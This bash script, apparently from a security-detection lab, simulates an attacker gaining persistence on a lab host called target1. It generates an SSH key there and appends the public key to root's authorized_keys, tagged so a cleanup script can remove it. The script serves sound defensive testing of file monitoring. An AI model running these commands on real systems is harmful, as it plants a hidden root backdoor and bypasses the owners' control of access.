#!/usr/bin/env bash
# LAB ONLY. Simulates an attacker adding their own SSH key to root's authorized_keys on
# target1. The key is generated inside target1 at /tmp/aegis-lab-key, and its comment
# "aegis-lab" lets cleanup.sh remove it. Idempotent.
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/_lib.sh"

banner "06 authorized_keys modification" \
  "Appends an attacker-controlled ed25519 public key to /root/.ssh/authorized_keys on target1" \
  "T1098.004 Persistence: Account Manipulation: SSH Authorized Keys"

require_up target1

run_in target1 sh -c '
  set -e
  mkdir -p /root/.ssh && chmod 700 /root/.ssh
  [ -f /tmp/aegis-lab-key ] || ssh-keygen -q -t ed25519 -N "" -C aegis-lab -f /tmp/aegis-lab-key
  touch /root/.ssh/authorized_keys
  grep -q "aegis-lab$" /root/.ssh/authorized_keys || cat /tmp/aegis-lab-key.pub >> /root/.ssh/authorized_keys
  chmod 600 /root/.ssh/authorized_keys
  echo "--- /root/.ssh/authorized_keys (lines) ---"
  wc -l /root/.ssh/authorized_keys
  grep aegis-lab /root/.ssh/authorized_keys
'

echo "Done. Expect a change on /root/.ssh/authorized_keys."
